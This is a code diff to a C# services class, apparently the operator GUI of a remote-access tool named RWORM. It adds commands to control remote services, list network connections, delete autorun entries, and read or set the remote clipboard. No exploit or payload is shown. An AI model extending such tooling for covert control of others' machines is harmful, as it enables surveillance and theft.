@@ -330,21 +330,67 @@ namespace RWORM.GUI.Services
 
         public void UnregisterRDHandler(string guid) => UnregisterHandler(guid, 0x81);
 
-        // ── System Metrics ───────────────────────────────────────────────────
-        public void RegisterMetricsHandler(string guid, Action<byte[]> cb)
-            => RegisterHandler(guid, 0x56, cb);
-        public void UnregisterMetricsHandler(string guid) => UnregisterHandler(guid, 0x56);
-        public Task RequestMetrics(string guid) => GuiSend(0x55, guid, Array.Empty<byte>());
-
-        // ── Remote Desktop Monitors ──────────────────────────────────────────
-        public void RegisterRDMonitorsHandler(string guid, Action<byte[]> cb)
-            => RegisterHandler(guid, 0x85, cb);
-        public void UnregisterRDMonitorsHandler(string guid) => UnregisterHandler(guid, 0x85);
-        public Task RequestMonitors(string guid) => GuiSend(0x84, guid, Array.Empty<byte>());
-        public Task StartRemoteDesktop(string guid, int monitorIndex = 0)
-            => GuiSend(0x80, guid, Encoding.UTF8.GetBytes(monitorIndex.ToString()));
+        // ── System Metrics ───────────────────────────────────────────────────
 
-        public Task StopRemoteDesktop(string guid)  => GuiSend(0x83, guid, Array.Empty<byte>());
+        public void RegisterMetricsHandler(string guid, Action<byte[]> cb)
+
+            => RegisterHandler(guid, 0x56, cb);
+
+        public void UnregisterMetricsHandler(string guid) => UnregisterHandler(guid, 0x56);
+
+        public Task RequestMetrics(string guid) => GuiSend(0x55, guid, Array.Empty<byte>());
+
+
+
+        // ── Remote Desktop Monitors ──────────────────────────────────────────
+
+        public void RegisterRDMonitorsHandler(string guid, Action<byte[]> cb)
+
+            => RegisterHandler(guid, 0x85, cb);
+
+        public void UnregisterRDMonitorsHandler(string guid) => UnregisterHandler(guid, 0x85);
+
+        public Task RequestMonitors(string guid) => GuiSend(0x84, guid, Array.Empty<byte>());
+
+        public Task StartRemoteDesktop(string guid, int monitorIndex = 0)
+            => GuiSend(0x80, guid, Encoding.UTF8.GetBytes(monitorIndex.ToString()));
+
+        public Task StopRemoteDesktop(string guid) => GuiSend(0x83, guid, Array.Empty<byte>());
+
+        // ── Service Manager ──────────────────────────────────────────────────
+        public void RegisterServicesHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xC1, cb);
+        public void UnregisterServicesHandler(string guid) => UnregisterHandler(guid, 0xC1);
+        public Task RequestServices(string guid) => GuiSend(0xC0, guid, Array.Empty<byte>());
+        public Task ControlService(string guid, string serviceName, string action, Action<byte[]>? cb = null)
+        {
+            if (cb != null) RegisterHandler(guid, 0xC3, cb);
+            return GuiSend(0xC2, guid, Encoding.UTF8.GetBytes($"{serviceName}\x00{action}"));
+        }
+
+        // ── Net Monitor ───────────────────────────────────────────────────────
+        public void RegisterNetHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xC5, cb);
+        public void UnregisterNetHandler(string guid) => UnregisterHandler(guid, 0xC5);
+        public Task RequestNetConnections(string guid) => GuiSend(0xC4, guid, Array.Empty<byte>());
+
+        // ── Autorun Manager ───────────────────────────────────────────────────
+        public void RegisterStartupHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xC7, cb);
+        public void UnregisterStartupHandler(string guid) => UnregisterHandler(guid, 0xC7);
+        public Task RequestStartupEntries(string guid) => GuiSend(0xC6, guid, Array.Empty<byte>());
+        public Task DeleteStartupEntry(string guid, string scope, string name, string location, Action<byte[]>? cb = null)
+        {
+            if (cb != null) RegisterHandler(guid, 0xC9, cb);
+            return GuiSend(0xC8, guid, Encoding.UTF8.GetBytes($"{scope}\x00{name}\x00{location}"));
+        }
+
+        // ── Clipboard Manager ─────────────────────────────────────────────────
+        public void RegisterClipboardHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xCB, cb);
+        public void UnregisterClipboardHandler(string guid) => UnregisterHandler(guid, 0xCB);
+        public Task RequestClipboard(string guid) => GuiSend(0xCA, guid, Array.Empty<byte>());
+        public Task SetClipboard(string guid, string text, Action<byte[]>? cb = null)
+        {
+            if (cb != null) RegisterHandler(guid, 0xCD, cb);
+            return GuiSend(0xCC, guid, Encoding.UTF8.GetBytes(text));
+        }
 
 
 
